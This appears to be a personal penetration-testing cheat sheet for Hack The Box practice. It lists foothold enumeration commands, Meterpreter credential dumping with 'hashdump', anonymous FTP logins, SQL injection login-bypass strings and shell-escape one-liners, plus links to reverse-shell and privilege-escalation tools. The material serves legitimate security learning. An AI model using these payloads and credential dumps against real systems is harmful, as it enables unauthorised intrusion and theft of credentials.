# Pentest

## How to Use the Script for nmap of HTB boxes
1. Create script on local system
2. Chmod +x script
3. Run script like this
```
sudo ./scriptgenerator.sh -c <Computer_Name_from_HTB> -i <IP Address of Box from HTB>
```
4. Once ran, navigate to ~/HTB/<boxname> and run the new generated script. You will have to chmod it.

## Linux Initial Foothold Steps
- id
- sudo -l
- whoami
- uname -a
- ip -br a
- cat /etc/passwd

## Windows Initial Foothold Steps (using Meterpreter)
- load kiwi
- hashdump

## FTP Common Login
- User: anonymous
- Password: password

Type the word 'binary' without quotes then press Enter then can upload files as need be.

## SQL Injection
`admin' --`<br>`admin' #`<br>`admin'/*`<br>`' or 1=1--`<br>`' or 1=1#`<br>`' or 1=1/*`<br>`') or '1'='1--`<br>`') or ('1'='1--`

## Reverse Shells
[https://www.revshells.com/](https://www.revshells.com/)

## Simple Ways to Gain Shells
| Program | Code |
| ----------- | ----------- |
| Vi | :!bash |
| Vi | :set shell=/bin/bash:shell |
| awk | awk 'BEGIN {system("/bin/bash")}' |
| perl | perl -e 'exec "/bin/bash";' |
| find | find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \; |

## Linux Enumeration
[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) - Few years old yet solid script<br>
[https://github.com/NullArray/RootHelper](https://github.com/NullArray/RootHelper) - Robust solution to Linux Enumeration

## Windows Enumeration Links
[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) - also privesc<br>
[https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)<br>
[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
[https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
[https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

## Logging Scripts for Pentest
Autocreate a script to record Command Line interactions
```
test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f $HOME/$(date +"%d-%b-%y_%H-%M-%S")_shell.log)
```

NEW (Change IP)
```
PS1='[`date +"%d-%b-%y %T"`]\[\033[01;31m\] `DGTWINT=$(ip route get 192.168.1.1 | grep via | cut -f 5 -d " ") && FASTINT=$(grep ^ /dev/null /sys/class/net/*/speed 2> /dev/null | sort -t: -k 2 | tail -1 | cut -f 5 -d "/") && if [ -n "${DGTWINT}" ] ; then TESTINT="${DGTWINT}"; else TESTINT="${FASTINT}"; fi && IPADDR=$(ip addr show dev "${TESTINT}" | grep "inet " | sed -e "s/.*inet //" | cut -f 1 -d "/") && echo "${TESTINT:0:1}:${IPADDR}"`\[\033[00m\] \[\033[01;34m\]\W\[\033[00m\] > '
```

## Encryption
[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) - Enter string and use the numerous encryptions on it<br>
[https://rot13.com/](https://rot13.com/) - Simplest form of encryption (can do more than just 13)

## Steganography
https://github.com/RickdeJager/stegseek - thousands times faster than than it's ancestor - Steghide<br>
https://github.com/Paradoxis/StegCracker - Finds passwords hidden with steganography

## Education / Learning / Practice
[https://picoctf.org/](https://picoctf.org/) - Simple, good to start with<br>
[https://www.vulnhub.com/](https://www.vulnhub.com/) - Easy once know how to setup properly due to different images<br>
[https://www.hackthebox.eu/](https://www.hackthebox.eu/) - the standard of Ethical Hacking Learning

## My Favorite Links
[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - More info on payloads than you can shake a stick at<br>
[Payload All the Things Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - Probably the most useful thing on this sheet for HTB.<br>


